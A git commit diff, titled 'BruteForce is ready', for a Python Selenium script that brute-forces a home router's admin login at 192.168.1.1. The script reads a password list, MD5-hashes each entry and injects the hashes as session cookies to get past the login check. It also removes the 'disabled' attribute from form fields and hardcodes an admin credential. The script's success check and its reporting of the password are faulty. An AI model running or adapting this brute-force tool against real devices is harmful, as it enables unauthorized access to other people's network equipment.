1e87f7189bd376666298cbbd0c6141cde0fa3599
Vvoox <khalil.daoulat@gmail.com>
2020-02-03 03:40:27 +0100

    BruteForce is ready

--- venv/RTester.py
+++ venv/RTester.py
@@ -12,30 +12,51 @@ from selenium.webdriver.chrome.options import Options
 from pyvirtualdisplay import Display
 import hashlib
 
-url = "http://192.168.1.1/rpSys.html"
-# chrome_options = Options()
-# chrome_options.add_argument("user-data-dir=./User_Data2")
-# chrome_options.add_argument('--headless')
-# chrome_options.add_argument('--no-sandbox')
-#chrome_options.add_argument('--disable-dev-shm-usage')
-# display = Display(visible=0, size=(800, 800))
-# display.start()
-# webdriver1= webdriver.Chrome(options=chrome_options)
-# self.driver.minimize_window()
-# webdriver1= webdriver.Chrome(options=chrome_options)
-webdriver1= webdriver.Chrome()
-webdriver1.get(url)
-print("Open the url ...")
-login = "admin"
-password = "error404"
-tipsvalue = webdriver1.find_element_by_xpath("//input[contains(@name, 'tipsFlag')]")
-timevalue = webdriver1.find_element_by_xpath("//input[contains(@name, 'timevalue')]")
+webdriver1 = webdriver.Chrome()
 
-loginMD5= hashlib.md5(login.encode()).hexdigest()
-passwordMD5= hashlib.md5(password.encode()).hexdigest()
+def start():
+    url = "http://192.168.1.1/rpSys.html"
+    # chrome_options = Options()
+    # chrome_options.add_argument("user-data-dir=./User_Data2")
+    # chrome_options.add_argument('--headless')
+    # chrome_options.add_argument('--no-sandbox')
+    # chrome_options.add_argument('--disable-dev-shm-usage')
+    # display = Display(visible=0, size=(800, 800))
+    # display.start()
+    # webdriver1= webdriver.Chrome(options=chrome_options)
+    # self.driver.minimize_window()
+    # webdriver1= webdriver.Chrome(options=chrome_options)
+    webdriver1.get(url)
+    print("Open the url ...")
+    login = "admin"
+    password = "error404"
+    tipsvalue = webdriver1.find_element_by_xpath("//input[contains(@name, 'tipsFlag')]")
+    timevalue = webdriver1.find_element_by_xpath("//input[contains(@name, 'timevalue')]")
+
+    loginMD5 = hashlib.md5(login.encode()).hexdigest()
+
+    file = open('passwordlist.txt', 'r')
+    Lines = file.readlines()
+
+    count = 0
+    for line in Lines:
+        print(line.strip())
+        passwordMD5 = hashlib.md5(line.strip().encode()).hexdigest()
+        add_cookies(loginMD5, passwordMD5)
+        print("try "+str(count)+" with Login = " + str(login) + " and Password = " + str(password))
+        count+=1
+        if (webdriver1.current_url == "http://192.168.1.1/rpSys.html"):
+            print("Worked :)")
+            print("Your login = " + login)
+            print("Your password = " + password)
+            break
+        else:
+            print("Not working !\n")
+
+    file.close()
+
 
 def submit():
-
     webdriver1.execute_script("arguments[0].value = '1';", tipsvalue)
     webdriver1.execute_script("arguments[0].value = '1';", timevalue)
 
@@ -43,19 +64,16 @@ def submit():
         .send_keys(login)
     sleep(1)
     webdriver1.find_element_by_xpath("//input[contains(@name, 'Login_Pwd')]") \
-            .send_keys(password)
+        .send_keys(password)
     sleep(1)
     webdriver1.find_element_by_xpath("//input[contains(@class, 'LoginBtn')]") \
-            .submit()
+        .submit()
     print("Done")
     print(timevalue.get_attribute('VALUE'))
     print(timevalue.get_attribute('VALUE'))
 
-# for i in range(5):
-    # send_message()
 
 def fixing():
-
     TextField = webdriver1.find_element_by_xpath("//input[contains(@name, 'Login_Name')]")
     webdriver1.execute_script('arguments[0].removeAttribute("disabled");', TextField)
 
@@ -67,10 +85,10 @@ def fixing():
 
     submit()
 
-def add_cookies():
 
-    cookie1 = {'name': 'C0', 'value' : loginMD5}
-    cookie2 = {'name': 'C1', 'value' : passwordMD5}
+def add_cookies(loginMD5, passwordMD5):
+    cookie1 = {'name': 'C0', 'value': loginMD5}
+    cookie2 = {'name': 'C1', 'value': passwordMD5}
 
     webdriver1.add_cookie(cookie1)
     webdriver1.add_cookie(cookie2)
@@ -78,8 +96,9 @@ def add_cookies():
     webdriver1.refresh()
     webdriver1.get("http://192.168.1.1/rpSys.html")
 
-    print(webdriver1.get_cookies())
+    sleep(2)
+    # print(webdriver1.get_cookies())
+    return webdriver1.current_url
 
-# fixing()
+start()
 
-add_cookies()
